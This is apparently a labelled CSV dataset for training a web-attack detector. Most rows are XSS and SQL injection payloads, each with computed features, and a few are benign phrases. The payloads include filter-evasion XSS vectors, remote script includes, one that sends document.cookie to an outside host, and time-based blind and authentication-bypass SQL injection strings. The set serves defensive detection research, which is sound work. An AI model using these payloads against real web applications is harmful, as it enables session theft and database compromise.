input,label,length,entropy,num_quotes,has_script,has_sql_keywords,special_char_ratio
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",2,91,3.589703113602988,0,0,1,0.296703293442821
&lt;IMG DYNSRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,1,65,4.598593390813312,0,0,0,0.261538457514793
"<body onPopState body onPopState=""javascript:javascript:alert(1)""></body onPopState>",1,84,4.488120958308014,2,0,0,0.1428571411564626
"<event-source src=""%(event)s"" onload=""javascript:alert(1)"">",1,59,4.449942625413014,4,0,0,0.25423728382648675
"<IMG SRC=x onsearch=""alert(String.fromCharCode(88,83,83))"">",1,59,4.855029651343355,2,0,0,0.22033897931628849
"ABC<div style=""x:\x0Aexpression(javascript:alert(1)"">DEF",1,56,4.847097109364437,2,0,0,0.19642856792091845
"));waitfor delay '0:0:5'--
benchmark(10000000,MD5(1))#
1 or benchmark(10000000,MD5(1))#
 or benchmark(10000000,MD5(1))#",2,119,4.500775536777744,2,0,0,0.22689075439587603
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[' or 1=1 or ''=']]></foof>",1,83,4.956070304710571,8,0,1,0.3734939714036871
"<IMG SRC=x onload=""alert(String.fromCharCode(88,83,83))"">",1,57,4.788858873737953,2,0,0,0.2280701714373654
"<TABLE BACKGROUND=""javascript:alert('XSS')"">",1,44,5.033184175406309,4,0,0,0.22727272210743815
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>,1,79,4.440777306534905,0,0,0,0.1772151876301875
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",1,57,4.696839356232049,0,0,0,0.28070174946137283
perl -e &apos;print &quot;&amp;&lt;SCR\0IPT&gt;alert(&quot;XSS&quot;)&lt;/SCR\0IPT&gt;&quot;;&apos; &gt; out,1,108,4.431833013854709,0,0,0,0.28703703437928674
ORDER BY 3--,2,12,3.084962500721156,0,0,0,0.16666665277777895
"`'><script>\xE2\x80\x8Ajavascript:alert(1)</script>
`'><script>\xE1\x9A\x80javascript:alert(1)</script>",1,103,4.593413390882807,2,1,0,0.2718446575549062
"<<SCRIPT>alert(""XSS"");//<</SCRIPT>",1,34,4.065260267657296,2,1,0,0.41176469377162667
"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")>",1,51,5.397915538049927,2,0,0,0.6274509680891968
));waitfor delay '0:0:5'--,2,26,4.161978179679554,2,0,0,0.3461538328402372
<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >,1,44,4.6352347434897885,0,0,0,0.27272726652892576
"<html onMouseUp html onMouseUp=""javascript:javascript:alert(1)""></html onMouseUp>",1,81,4.622162546747481,2,0,0,0.14814814631915868
"<img\x11src=x onerror=""javascript:alert(1)"">",1,44,4.481714572986073,2,0,0,0.22727272210743815
"<SCRIPT SRC=""http://ha.ckers.org/xss.jpg""></SCRIPT>",1,51,4.618024606465273,2,0,0,0.29411764129181095
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--",2,97,4.243611968003475,2,0,0,0.3195876255712616
"<SCRIPT ="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1,55,4.585460849691617,4,0,0,0.34545453917355384
<script language='javascript' src='%(jscript)s'></script>,1,57,4.241152190424381,4,0,0,0.24561403077870123
"<<SCRIPT>alert(""XSS"");//<</SCRIPT>",1,34,4.065260267657296,2,1,0,0.41176469377162667
"<IMG SRC=x ononline=""alert(String.fromCharCode(88,83,83))"">",1,59,4.772307879796978,2,0,0,0.22033897931628849
"><script>alert(1337)</script>><script>alert(""XSS by \nxss</h1></marquee>",1,72,4.5898608570970625,1,1,0,0.27777777391975317
"<;IMG SRC=""; &;#14;  javascript:alert(';XSS';);"";>;",1,51,4.612835145553696,4,0,0,0.41176469780853536
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL--",2,77,4.540684392375621,2,0,1,0.24675324354865918
"/*iframe/src*/<iframe/src=""<iframe/src=@""/onload=prompt(1) /*iframe/src*/>",1,74,4.266376257802435,2,0,0,0.32432431994156324
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",2,91,4.089638558808817,6,0,1,0.34065933691583145
<IMG SRC=JaVaScRiPt:alert('XSS')>,1,33,4.47606419505047,2,0,0,0.2424242350780535
";waitfor delay '0:0:5'--
');waitfor delay '0:0:5'--
);waitfor delay '0:0:5'--",2,77,4.211474728980622,7,0,0,0.3116883076404116
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16",2,73,4.191364676013277,6,0,1,0.3424657487333459
<iframe src=http://ha.ckers.org/scriptlet.html <,1,48,4.215199876515856,0,0,0,0.20833332899305565
ORDER BY 1#,2,11,3.095795255000934,0,0,0,0.09090908264462885
ORDER BY 6,2,10,2.9219280948873623,0,0,0,0.0
"<LINK REL=""stylesheet"" HREF=""http://ha.ckers.org/xss.css"">",1,58,4.618047426836302,4,0,0,0.2586206851961951
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7--",2,57,4.461296865614145,2,0,0,0.2982456088027086
"<SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1,56,4.6685256807930084,2,0,0,0.33928570822704096
"<meta charset=""x-imap4-modified-utf7"">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi",1,137,4.672218945165461,2,0,0,0.16058394043369387
"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",1,51,4.976155243847438,6,0,0,0.2745097985390236
"<img \x11src=x onerror=""javascript:alert(1)"">",1,45,4.491418651692922,2,0,0,0.22222221728395075
please login to continue,0,24,3.542481250360578,0,0,0,0.0
"\"";alert('XSS');//",1,18,3.7254805569978675,3,0,0,0.5555555246913597
ORDER BY 4,2,10,2.9219280948873623,0,0,0,0.0
"<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">",1,94,4.80747170444819,2,0,0,0.234042550701675
"UNION SELECT @@VERSION,SLEEP(5),""'3",2,35,4.183014003266002,2,0,1,0.22857142204081654
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15",2,94,4.568831241623407,2,0,1,0.28723403949751025
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>,1,47,4.477372032888474,0,0,0,0.40425531054775937
"`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>
'`><\x00img src=xxx:x onerror=javascript:alert(1)>",1,100,4.64637013015618,1,0,0,0.22999999770000004
"<IMG SRC=""javascript:alert('XSS')""",1,34,4.572469458770135,4,0,0,0.2647058745674743
"<form id=""test"" /><button form=""test"" formaction=""javascript:javascript:alert(1)"">X",1,83,4.530067335598629,6,0,0,0.21686746726665704
<script itworksinallbrowsers>/*<script* */alert(1)</script,1,58,4.187121246496803,0,0,0,0.20689654815695607
<svg><script ?>alert(1),1,23,4.088779347361361,0,0,0,0.3043478128544429
</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera},1,83,5.246741353133134,4,0,0,0.22891565989258242
search for latest news,0,22,3.5383105956150063,0,0,0,0.0
view product details,0,20,3.8219280948873626,0,0,0,0.0
"<a href=""jAvAsCrIpT&colon;alert&lpar;1&rpar;"">X</a>",1,51,4.532445626531934,2,0,0,0.2745097985390236
"`'><script>\xE2\x80\x86javascript:alert(1)</script>
`'><script>\xE1\xA0\x8Ejavascript:alert(1)</script>",1,103,4.586084386007433,2,1,0,0.2718446575549062
"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",1,51,4.976155243847438,6,0,0,0.2745097985390236
&lt;,1,4,2.0,0,0,0,0.49999987500003124
ORDER BY 1,2,10,2.9219280948873623,0,0,0,0.0
"<IMG SRC= onmouseover=""alert('xxs')"">",1,37,4.574054041187682,4,0,0,0.2702702629656686
"`""><\x3Cscript>javascript:alert(1)</script>",1,43,4.344187428818823,1,0,0,0.27906976095186603
"`'><script>\xEF\xBB\xBFjavascript:alert(1)</script>
`'><script>\xE2\x80\x81javascript:alert(1)</script>",1,103,4.593413390882807,2,1,0,0.2718446575549062
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--",2,87,4.203823144380381,6,0,1,0.3563218349848065
<SCRIPT onreadystatechange=javascript:javascript:alert(1);></SCRIPT>,1,68,4.776883201856755,0,0,0,0.16176470350346026
"<embed src=""data:text/html;base64,%(base64)s"">",1,46,4.428680913087442,2,0,0,0.2608695595463139
"<a href=""javas\x06cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,71,4.710580788978146,4,0,0,0.22535210950208298
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+,1,131,4.008203440287082,4,1,0,0.24427480729561216
"';!--""<XSS>=&{()}",1,17,3.85216872360328,2,0,0,0.8235293633218022
"<div style=""background-image: url(javascript:document.vulnerable=true;);"">",1,74,4.721438042136319,2,0,0,0.18918918663257855
<IFRAME SRC=”http://hacker-site.com/xss.html”>,1,46,4.778677988524613,0,0,0,0.2608695595463139
"<meta http-equiv=""refresh"" content=""0;url=javascript:confirm(1)"">",1,65,4.660775605889718,4,0,0,0.21538461207100598
"><img src=x onerror=window.open('https://www.google.com/');>
<form><button formaction=javascript&colon;alert(1)>CLICKME
<math><a xlink:href=//jsfiddle.net/t846h/"">click",1,168,5.15372713076636,3,0,0,0.22619047484410432
<!-- -- --><script>document.vulnerable=true;</script><!-- -- -->,1,64,4.241729296672175,0,1,0,0.4062499936523439
<script /**/>/**/alert(1)/**/</script /**/,1,42,3.6294817080809567,0,0,0,0.5238095113378688
http://www.google<script .com>alert(document.location)</script,1,62,4.392744698282444,0,0,0,0.19354838397502608
//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\,1,87,4.444871151920139,2,0,0,0.41379309869203335
view product details,0,20,3.8219280948873626,0,0,0,0.0
"<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d",1,72,4.6428647666912815,0,0,0,0.19444444174382722
"SLEEP(1)/*' or SLEEP(1) or '"" or SLEEP(1) or ""*/",2,48,3.667481250360578,4,0,0,0.2916666605902779
"<~/XSS/*-*/STYLE=xss:e/**/xpression(window.location=""http://www.procheckup.com/?sid=""%2bdocument.cookie)>",1,105,4.9547948088895,2,0,0,0.2952380924263039
"ABC<div style=""x:\x09expression(javascript:alert(1)"">DEF",1,56,4.882811395078723,2,0,0,0.19642856792091845
//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//,1,94,4.631970267514144,2,0,0,0.24468084846084204
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",2,182,3.595893061294957,2,0,1,0.21978021857263616
"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1,86,4.868725953515188,4,1,0,0.30232557787993514
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))",2,112,4.396179460248948,0,0,1,0.2589285691167092
"<IMG SRC=x onunload=""alert(String.fromCharCode(88,83,83))"">",1,59,4.827309786539971,2,0,0,0.22033897931628849
"<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script",1,83,4.79190581187394,2,0,0,0.2650602377703586
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--",2,94,4.269387354442831,2,0,0,0.3191489327750114
"<html onmousemove html onmousemove=""javascript:javascript:alert(1)""></html onmousemove>",1,87,4.396180496806704,2,0,0,0.13793103289734446
"admin"") or (""1""=""1""#",2,20,3.541446071165522,5,0,0,0.4499999775000011
"`""'><img src=xxx:x \x0Donerror=javascript:alert(1)>",1,51,4.65528214626704,2,0,0,0.2549019557862362
"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",1,78,5.1491305460021115,6,0,0,0.2692307657790928
"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert('XSS');"">",1,81,5.20233191044737,6,0,0,0.2716049349184576
"<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>",1,149,4.094618037104945,0,0,0,0.36912751430115764
"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(XSS"")>",1,51,5.397915538049927,1,0,0,0.6274509680891968
"<""';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",1,233,4.792394962438543,7,1,0,0.3004291832599606
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL--",2,97,4.337654848842882,2,0,1,0.23711339961738764
&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;,1,234,3.7252444694820808,0,0,0,0.41452991275841916
"<script>if(""x\\xEE\xA9\x93"".length==2) { javascript:alert(1);}</script>",1,71,4.957786690165377,2,1,0,0.30985915056536406
"<IMG SRC=x onerror=""alert(String.fromCharCode(88,83,83))"">",1,58,4.700028245839121,2,0,0,0.22413792717003575
"<a href=""\xC2\xA0javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,75,4.8130745642640935,4,0,0,0.2266666636444445
"&lt;HEAD&gt;&lt;META HTTP-EQUIV=\""CONTENT-TYPE\"" CONTENT=\""text/html; charset=UTF-7\""&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",1,149,5.123729161607788,6,0,0,0.288590602089996
"ABC<div style=""x\x3Aexpression(javascript:alert(1)"">DEF",1,55,4.840006304237072,2,0,0,0.18181817851239676
search for latest news,0,22,3.5383105956150063,0,0,0,0.0
"and (select substring(@@version,1,1))='X'",2,41,4.442679443536939,2,0,1,0.26829267638310544
"&lt;A HREF=\""http&#58;//www&#46;gohttp&#58;//www&#46;google&#46;com/ogle&#46;com/\""&gt;XSS&lt;/A&gt;",1,100,4.462564726080142,2,0,0,0.3799999962
"><img src=x onerror=window.open('https://www.google.com/');>
<form><button formaction=javascript&colon;alert(1)>CLICKME
<math><a xlink:href=//jsfiddle.net/t846h/"">click",1,168,5.15372713076636,3,0,0,0.22619047484410432
foo<script>alert(1)</script>,1,28,3.9677201004744993,0,1,0,0.24999999107142887
ORDER BY 31337--,2,16,3.327819531114783,0,0,0,0.12499999218750048
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe,1,112,3.2875905006166777,0,0,0,0.12499999888392858
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",1,67,4.67961377270283,2,1,0,0.298507458231232
"<style><img src=""</style><img src=x onerror=alert(XSS)//"">",1,58,4.409030994829163,2,0,0,0.29310344322235443
"<script>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://www.securitycompass.com/xss.js""></script>",1,97,4.8339311417113775,4,1,0,0.26804123435009036
RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=',2,83,4.530118825780956,3,0,1,0.1325301188851793
<;/script>;<;script>;alert(1)<;/script>;,1,40,3.7709505944546686,0,0,0,0.39999999000000025
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--",2,100,4.231008514777183,2,0,0,0.3199999968
"<img\x10src=x onerror=""javascript:alert(1)"">",1,44,4.544325652580697,2,0,0,0.22727272210743815
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))--",2,114,4.446472016598342,0,0,1,0.2719298221760542
"<IMG SRC=""javascript:alert('XSS');"">",1,36,4.68354236243323,4,0,0,0.3055555470679015
"<STYLE TYPE=""text/javascript"">javascript:alert(1);</STYLE>",1,58,4.681449426894339,2,0,0,0.22413792717003575
search for latest news,0,22,3.5383105956150063,0,0,0,0.0
UNION ALL SELECT NULL--,2,23,3.344456935241198,0,0,1,0.08695651795841226
&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;,1,57,4.567294128420573,0,0,0,0.24561403077870123
"<input TYPE=""IMAGE"" SRC=""javascript:document.vulnerable=true;"">",1,63,4.945223574156204,4,0,0,0.19047618745275893
"<div onmouseover=""document.vulnerable=true;"">",1,45,4.207976707200401,2,0,0,0.1777777738271606
<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera},1,69,4.95658324728014,2,0,0,0.26086956143667306
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))#",2,199,4.269753360673994,0,0,1,0.28643215936466254
"<script/src=""data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')""></script a=\u0061 & /=%2F",1,99,4.820690627525281,4,0,0,0.2626262599734721
ORDER BY 19,2,11,3.095795255000934,0,0,0,0.0
admin' or '1'='1'#,2,18,3.3027227528624894,5,0,0,0.3888888672839518
"<a href=""\x20javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,71,4.710580788978146,4,0,0,0.22535210950208298
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7",2,48,4.151754427398839,6,0,1,0.3333333263888891
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",2,98,4.173028543097308,2,0,0,0.30612244585589343
"<;A HREF="";//google"";>;XSS<;/A>;",1,32,3.9292292966721747,2,0,0,0.49999998437500054
"""></title><script>alert(1337)</script>><marquee><h1>XSS by xss</h1></marquee>",1,77,4.485299165018603,1,1,0,0.2987012948220611
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#",2,114,4.15707266413394,2,0,0,0.31578947091412746
<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>,1,78,4.727083308328471,2,0,0,0.17948717718606183
RANDOMBLOB(500000000/2),2,23,3.306170651709187,0,0,0,0.1304347769376184
&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;)}&lt;/STYLE&gt;,1,120,4.824853069110775,0,0,0,0.25833333118055557
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#",2,56,4.346398894769656,6,0,1,0.3571428507653063
"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",1,78,5.1491305460021115,6,0,0,0.2692307657790928
"<x style=""background:url('x&#1;;color:red;/*')"">XXX</x>",1,55,4.840006304237072,4,0,0,0.3818181748760332
"<a href=""data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>"">X</a",1,75,5.123567317301466,2,0,0,0.33333332888888895
"<div style=""list-style:url(http://foo.f)\20url(javascript:javascript:alert(1));"">X",1,82,4.77080646878327,2,0,0,0.2560975578524688
"<head><base href=""javascript://""></head><body><a href=""/. /,javascript:alert(1)//#"">XXX</a></body>",1,98,4.615266702684168,4,0,0,0.3673469350270721
AND 7300=7300 AND ('pKlZ'='pKlZ,2,31,3.744203568311813,3,0,0,0.19354838085327802
<script>javascript:alert(1)</script\x0A,1,39,4.214262795507958,0,1,0,0.20512819986850772
"<meta http-equiv=""refresh"" content=""0;url=javascript:document.vulnerable=true;"">",1,80,4.548010557409426,4,0,0,0.18749999765625003
"`'><script>\x09javascript:alert(1)</script>
`'><script>\xE2\x80\x89javascript:alert(1)</script>",1,95,4.537659292268194,2,1,0,0.2736842076454294
"<IMG SRC=x oncuechange=""alert(String.fromCharCode(88,83,83))"">",1,62,4.8732358263763285,2,0,0,0.20967741597294492
<<script>document.vulnerable=true;</script>,1,43,4.257319115016275,0,1,0,0.20930232071389954
&lt;SCRIPT&gt;alert(/XSS/&#46;source)&lt;/SCRIPT&gt;,1,52,4.386234017609604,0,0,0,0.30769230177514806
<div style=content:url(%(svg)s)></div>,1,38,4.398857447483311,0,0,0,0.31578946537396146
"<;A HREF="";http://google:ha.ckers.org"";>;XSS<;/A>;",1,50,4.608367439558378,2,0,0,0.3999999920000002
leave a comment,0,15,3.1898980954642875,0,0,0,0.0
"<div STYLE=""background-image: url(javascript:document.vulnerable=true;)"">",1,73,4.87855367651164,2,0,0,0.17808218934133987
"<DIV STYLE=""width: expression(alert('XSS'));"">",1,46,4.925523369006427,4,0,0,0.28260868950850676
"ABC<div style=""x:\xE2\x80\x87expression(javascript:alert(1)"">DEF",1,64,4.947123781480403,2,0,0,0.20312499682617194
"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",1,49,4.598904996955671,2,0,0,0.2653061170345691
"<svg onload svg onload=""javascript:javascript:alert(1)""></svg onload>",1,69,4.39108252251704,2,0,0,0.173913040957782
"<SCRIPT a="">"" '' SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1,59,4.653332455921489,6,0,0,0.3559321973570814
"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",1,49,4.598904996955671,2,0,0,0.2653061170345691
SLEEP(5)=',2,10,3.1219280948873624,1,0,0,0.39999996000000404
"ABC<div style=""x:\xE2\x80\x85expression(javascript:alert(1)"">DEF",1,64,4.947123781480403,2,0,0,0.20312499682617194
"&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt;",1,132,5.441385957284069,0,0,0,0.15909090788567495
"ABC<div style=""x:exp\x5Cression(javascript:alert(1)"">DEF",1,56,4.847097109364437,2,0,0,0.19642856792091845
&lt;A HREF=&quot;http://0102.0146.0007.00000223/&quot;&gt;XSS&lt;/A&gt;,1,71,4.366886938969596,0,0,0,0.2957746437214839
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--",2,106,4.218362875420073,2,0,0,0.3207547139551442
"<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">",1,49,4.750127640511121,4,0,0,0.32653060558100805
&lt;A HREF=&quot;//google&quot;&gt;XSS&lt;/A&gt;,1,48,3.917481250360578,0,0,0,0.3333333263888891
please login to continue,0,24,3.542481250360578,0,0,0,0.0
AND 1=0--,2,9,2.94770277922009,0,0,0,0.33333329629630043
"<A HREF=""http://0102.0146.0007.00000223/"">XSS</A>",1,49,4.195046113312408,2,0,0,0.3061224427321951
"`""'><img src=xxx:x onerror\x09=javascript:alert(1)>",1,51,4.65528214626704,2,0,0,0.2549019557862362
&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera},1,79,4.807413667056032,0,0,0,0.26582278144528126
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7#",2,73,4.596365395627136,2,0,1,0.27397259898667675
thank you for your order,0,24,3.418295834054489,0,0,0,0.0
